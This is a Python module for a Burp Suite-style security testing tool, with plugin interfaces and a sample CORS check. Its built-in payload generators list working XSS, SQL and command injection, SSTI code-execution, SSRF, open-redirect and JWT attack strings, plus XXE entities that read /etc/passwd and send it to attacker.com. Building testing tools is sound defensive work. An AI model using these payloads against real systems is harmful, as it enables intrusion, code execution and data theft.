"""
Burp Suite-style Extender Module
Plugin system and API for extending functionality
"""
from dataclasses import dataclass, field
from typing import Dict, Any, List, Optional, Callable, Protocol
from abc import ABC, abstractmethod
import asyncio
import json
import inspect
import importlib.util
from pathlib import Path


class ExtensionPoint(Protocol):
    """Protocol for extension points"""
    pass


@dataclass
class ExtensionMetadata:
    name: str
    version: str
    author: str
    description: str
    entry_point: str  # module:function or class
    dependencies: List[str] = field(default_factory=list)
    config_schema: Dict = field(default_factory=dict)


class ExtensionBase(ABC):
    """Base class for all extensions"""
    
    def __init__(self, context: 'ExtensionContext'):
        self.context = context
        self.name = self.__class__.__name__
    
    @abstractmethod
    async def initialize(self):
        pass
    
    @abstractmethod
    async def shutdown(self):
        pass


class ExtensionContext:
    """Context provided to extensions for accessing core functionality"""
    
    def __init__(self, app_core):
        self.app = app_core
        self.config = {}
        self.shared_data = {}
        self._hooks: Dict[str, List[Callable]] = {}
    
    def register_hook(self, hook_name: str, callback: Callable):
        if hook_name not in self._hooks:
            self._hooks[hook_name] = []
        self._hooks[hook_name].append(callback)
    
    async def trigger_hook(self, hook_name: str, *args, **kwargs):
        if hook_name in self._hooks:
            for cb in self._hooks[hook_name]:
                try:
                    if asyncio.iscoroutinefunction(cb):
                        await cb(*args, **kwargs)
                    else:
                        cb(*args, **kwargs)
                except Exception as e:
                    print(f"Hook {hook_name} error: {e}")
    
    def get_service(self, service_name: str):
        return getattr(self.app, service_name, None)
    
    def set_config(self, key: str, value: Any):
        self.config[key] = value
    
    def get_config(self, key: str, default=None):
        return self.config.get(key, default)
    
    def share_data(self, key: str, value: Any):
        self.shared_data[key] = value
    
    def get_shared_data(self, key: str, default=None):
        return self.shared_data.get(key, default)


class IntruderPayloadGenerator(ExtensionBase):
    """Extension point for custom Intruder payload generators"""
    
    @abstractmethod
    def generate_payloads(self, base_value: str, position: str) -> List[str]:
        """Generate payloads for a given base value and position"""
        pass
    
    @abstractmethod
    def get_payload_type(self) -> str:
        """Return payload type identifier"""
        pass


class ScannerCheck(ExtensionBase):
    """Extension point for custom vulnerability checks"""
    
    @abstractmethod
    async def check(self, request: 'RepeaterRequest', response: 'RepeaterResponse') -> List['VulnerabilityFinding']:
        """Run check against request/response pair"""
        pass
    
    @abstractmethod
    def get_check_id(self) -> str:
        """Unique check identifier"""
        pass
    
    @abstractmethod
    def get_severity(self) -> str:
        """Return severity: critical, high, medium, low, info"""
        pass


class SessionHandler(ExtensionBase):
    """Extension point for custom session handling"""
    
    @abstractmethod
    async def get_auth_headers(self, url: str) -> Dict[str, str]:
        """Return authentication headers for a URL"""
        pass
    
    @abstractmethod
    async def handle_response(self, response: 'RepeaterResponse') -> bool:
        """Process response, return True if session needs refresh"""
        pass


class MacroEngine(ExtensionBase):
    """Extension point for macro sequences (like Burp's session handling macros)"""
    
    @abstractmethod
    async def execute(self, context: ExtensionContext) -> Dict[str, Any]:
        """Execute macro, return extracted values (tokens, cookies, etc.)"""
        pass


@dataclass
class VulnerabilityFinding:
    check_id: str
    title: str
    severity: str
    confidence: str  # confirmed, suspected
    description: str
    evidence: Dict[str, Any]
    request: 'RepeaterRequest'
    response: 'RepeaterResponse'
    remediation: str = ""


class ExtensionManager:
    def __init__(self, app_core):
        self.app_core = app_core
        self.extensions: Dict[str, ExtensionBase] = {}
        self.metadata: Dict[str, ExtensionMetadata] = {}
        self.payload_generators: Dict[str, IntruderPayloadGenerator] = {}
        self.scanner_checks: Dict[str, ScannerCheck] = {}
        self.session_handlers: Dict[str, SessionHandler] = {}
        self.macros: Dict[str, MacroEngine] = {}
    
    def load_extension(self, path: str) -> bool:
        """Load extension from Python file"""
        try:
            spec = importlib.util.spec_from_file_location("extension", path)
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)
            
            # Find extension classes
            for name, obj in inspect.getmembers(module):
                if inspect.isclass(obj) and issubclass(obj, ExtensionBase) and obj != ExtensionBase:
                    context = ExtensionContext(self.app_core)
                    instance = obj(context)
                    self.extensions[name] = instance
                    asyncio.create_task(instance.initialize())
                    print(f"Loaded extension: {name}")
            return True
        except Exception as e:
            print(f"Failed to load extension {path}: {e}")
            return False
    
    def load_extension_class(self, extension_class: type, name: str = None) -> bool:
        """Load extension from class"""
        try:
            name = name or extension_class.__name__
            context = ExtensionContext(self.app_core)
            instance = extension_class(context)
            self.extensions[name] = instance
            asyncio.create_task(instance.initialize())
            
            # Auto-register by type
            if issubclass(extension_class, IntruderPayloadGenerator):
                self.payload_generators[name] = instance
            elif issubclass(extension_class, ScannerCheck):
                self.scanner_checks[name] = instance
            elif issubclass(extension_class, SessionHandler):
                self.session_handlers[name] = instance
            elif issubclass(extension_class, MacroEngine):
                self.macros[name] = instance
            
            print(f"Registered extension: {name}")
            return True
        except Exception as e:
            print(f"Failed to register extension {name}: {e}")
            return False
    
    def get_payload_generator(self, name: str) -> Optional[IntruderPayloadGenerator]:
        return self.payload_generators.get(name)
    
    def get_scanner_check(self, name: str) -> Optional[ScannerCheck]:
        return self.scanner_checks.get(name)
    
    def get_session_handler(self, name: str) -> Optional[SessionHandler]:
        return self.session_handlers.get(name)
    
    def get_macro(self, name: str) -> Optional[MacroEngine]:
        return self.macros.get(name)
    
    async def run_all_checks(self, request: 'RepeaterRequest', response: 'RepeaterResponse') -> List[VulnerabilityFinding]:
        """Run all registered scanner checks"""
        findings = []
        for check in self.scanner_checks.values():
            try:
                result = await check.check(request, response)
                findings.extend(result)
            except Exception as e:
                print(f"Scanner check {check.get_check_id()} failed: {e}")
        return findings
    
    async def run_macro(self, name: str) -> Dict[str, Any]:
        """Run a macro by name"""
        macro = self.macros.get(name)
        if macro:
            context = ExtensionContext(self.app_core)
            return await macro.execute(context)
        return {}
    
    async def shutdown_all(self):
        for ext in self.extensions.values():
            try:
                await ext.shutdown()
            except Exception as e:
                print(f"Error shutting down {ext.name}: {e}")


# Built-in payload generators
class BuiltInPayloadGenerators:
    """Collection of built-in payload generators"""
    
    @staticmethod
    def xss_payloads(context: str = "html") -> List[str]:
        payloads = {
            "html": [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<details open ontoggle=alert(1)>',
                '<body onfocus=alert(1) autofocus>',
                '<input onfocus=alert(1) autofocus>',
                '<select onfocus=alert(1) autofocus>',
                '<textarea onfocus=alert(1) autofocus>',
                '<keygen onfocus=alert(1) autofocus>',
                '<video><source onerror=alert(1)>',
                '<audio><source onerror=alert(1)>',
                '<marquee onstart=alert(1)>',
                '<isindex onfocus=alert(1) autofocus>',
            ],
            "attribute": [
                '" onfocus=alert(1) autofocus "',
                "' onfocus=alert(1) autofocus '",
                '" onmouseover=alert(1) "',
                "' onmouseover=alert(1) '",
                '" autofocus onfocus=alert(1) "',
            ],
            "javascript": [
                "';alert(1);//",
                "\";alert(1);//",
                "`;alert(1);//",
                "'-alert(1)-'",
                "\"-alert(1)-\"",
                "${alert(1)}",
                "#{alert(1)}",
            ],
            "url": [
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
                "vbscript:alert(1)",
            ]
        }
        return payloads.get(context, payloads["html"])
    
    @staticmethod
    def sqli_payloads(dbms: str = "generic") -> List[str]:
        payloads = {
            "generic": [
                "' OR '1'='1",
                "' OR '1'='1--",
                "' OR '1'='1#",
                "' OR '1'='1/*",
                '" OR "1"="1',
                '" OR "1"="1--',
                "') OR ('1'='1",
                "') OR ('1'='1--",
            ],
            "mysql": [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--",
                "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT @@version), 0x7e), 1)--",
            ],
            "postgres": [
                "' UNION SELECT NULL--",
                "'; SELECT pg_sleep(5)--",
                "' AND 1=CAST((SELECT version()) AS INT)--",
                "' || (SELECT pg_sleep(5))--",
            ],
            "mssql": [
                "' WAITFOR DELAY '0:0:5'--",
                "'; WAITFOR DELAY '0:0:5'--",
                "' AND 1=CAST((SELECT @@version) AS INT)--",
                "'; EXEC xp_cmdshell 'whoami'--",
            ],
            "oracle": [
                "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM sys.v_$version WHERE rownum=1))--",
                "' || (SELECT pg_sleep(5) FROM dual)--",
            ],
            "time_based": [
                "'; SELECT SLEEP(5)--",
                "'; SELECT pg_sleep(5)--",
                "' WAITFOR DELAY '0:0:5'--",
                "'; SELECT * FROM (SELECT(SLEEP(5)))a--",
                "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            ]
        }
        return payloads.get(dbms, payloads["generic"])
    
    @staticmethod
    def nosqli_payloads() -> List[str]:
        return [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "function() { return true; }"}',
            '{"$exists": true}',
            '{"$nin": []}',
            '{"$in": ["admin", "administrator", "root"]}',
            '{"$or": [{"username": "admin"}, {"username": "administrator"}]}',
        ]
    
    @staticmethod
    def cmdi_payloads(os_type: str = "unix") -> List[str]:
        if os_type == "windows":
            return [
                "& whoami",
                "| whoami",
                "&& whoami",
                "|| whoami",
                "^ whoami",
                "%0A whoami",
                "%0D whoami",
            ]
        return [
            "; id",
            "`id`",
            "$(id)",
            "|| id",
            "&& id",
            "| id",
            "\nid\n",
            "`id`",
            "$(id)",
            "; cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "; nslookup $RANDOM.burpcollaborator.net",
            "`nslookup $RANDOM.burpcollaborator.net`",
        ]
    
    @staticmethod
    def ssti_payloads(engine: str = "generic") -> List[str]:
        payloads = {
            "generic": [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "#{7*7}",
                "{7*7}",
                "@(7*7)",
            ],
            "jinja2": [
                "{{7*7}}",
                "{{config}}",
                "{{self.__class__.__mro__[1].__subclasses__()}}",
                "{{''.__class__.__mro__[1].__subclasses__()[0]}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            ],
            "twig": [
                "{{7*7}}",
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                "{{['id']|filter('system')}}",
            ],
            "freemarker": [
                "${7*7}",
                "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}",
                "${<#assign ex=\"freemarker.template.utility.Execute\"?new()> ex(\"id\")}",
            ],
            "velocity": [
                "#set($x=7*7) $x",
                "#set($rt=$class.forName('java.lang.Runtime')) #set($proc=$rt.getRuntime().exec('id')) $proc.waitFor()",
            ],
            "smarty": [
                "{7*7}",
                "{php}echo `id`;{/php}",
                "{system('id')}",
            ],
        }
        return payloads.get(engine, payloads["generic"])
    
    @staticmethod
    def xxe_payloads() -> List[str]:
        return [
            '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>''',
            '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd"> %remote;]><root>&exfil;</root>''',
            '''<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">%eval;%exfil;]>''',
            '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>''',
        ]
    
    @staticmethod
    def path_traversal_payloads() -> List[str]:
        return [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
            "....//....//....//....//etc/passwd",
            "..%00/..%00/..%00/..%00/etc/passwd",
            "/var/www/../../etc/passwd",
            "/images/../../../etc/passwd",
        ]
    
    @staticmethod
    def ssrf_payloads() -> List[str]:
        return [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.azure.com/metadata/instance?api-version=2021-02-01",
            "http://localhost:80",
            "http://127.0.0.1:80",
            "http://[::1]:80",
            "http://0.0.0.0:80",
            "http://2130706433:80",
            "http://0x7f000001:80",
            "http://0177.0.0.1:80",
            "http://localhost.localdomain:80",
            "http://localtest.me:80",
            "http://127.0.0.1.nip.io:80",
            "http://[::ffff:7f00:1]:80",
        ]
    
    @staticmethod
    def open_redirect_payloads() -> List[str]:
        return [
            "https://evil.com",
            "//evil.com",
            "https://evil.com@target.com",
            "https://target.com@evil.com",
            "https://evil.com%2f@target.com",
            "https://target.com%2fevil.com",
            "/\\evil.com",
            "//evil.com/",
            "https:evil.com",
            "javascript:alert(1)//",
        ]
    
    @staticmethod
    def jwt_payloads() -> List[Dict]:
        return [
            {"alg": "none", "typ": "JWT"},
            {"alg": "HS256", "typ": "JWT"},
            {"alg": "RS256", "typ": "JWT", "kid": "../../../../etc/passwd"},
            {"alg": "HS256", "typ": "JWT", "kid": "test"},
        ]
    
    @staticmethod
    def prototype_pollution_payloads() -> List[str]:
        return [
            '{"__proto__": {"polluted": "yes"}}',
            '{"constructor": {"prototype": {"polluted": "yes"}}}',
            '{"__proto__": {"isAdmin": true}}',
            '{"constructor.prototype.isAdmin": true}',
        ]


# Example custom extension
class ExampleCustomCheck(ScannerCheck):
    """Example custom vulnerability check"""
    
    async def initialize(self):
        pass
    
    async def shutdown(self):
        pass
    
    def get_check_id(self) -> str:
        return "custom-cors-misconfig"
    
    def get_severity(self) -> str:
        return "medium"
    
    async def check(self, request, response) -> List[VulnerabilityFinding]:
        findings = []
        acao = response.headers.get('access-control-allow-origin', '')
        acac = response.headers.get('access-control-allow-credentials', '')
        
        if acao and acao != 'null' and acac.lower() == 'true':
            # Check if origin is reflected
            origin = request.headers.get('Origin', '')
            if origin and origin in acao:
                findings.append(VulnerabilityFinding(
                    check_id=self.get_check_id(),
                    title="CORS Misconfiguration: Reflects Arbitrary Origin with Credentials",
                    severity=self.get_severity(),
                    confidence="confirmed",
                    description="The server reflects the Origin header in Access-Control-Allow-Origin and allows credentials.",
                    evidence={
                        "origin": origin,
                        "acao": acao,
                        "acac": acac
                    },
                    request=request,
                    response=response,
                    remediation="Use specific allowed origins. Never reflect arbitrary origins with credentials."
                ))
        return findings


# Export main classes
__all__ = [
    'ExtensionBase',
    'ExtensionContext',
    'ExtensionManager',
    'ExtensionMetadata',
    'IntruderPayloadGenerator',
    'ScannerCheck',
    'SessionHandler',
    'MacroEngine',
    'VulnerabilityFinding',
    'BuiltInPayloadGenerators',
    'ExampleCustomCheck',
]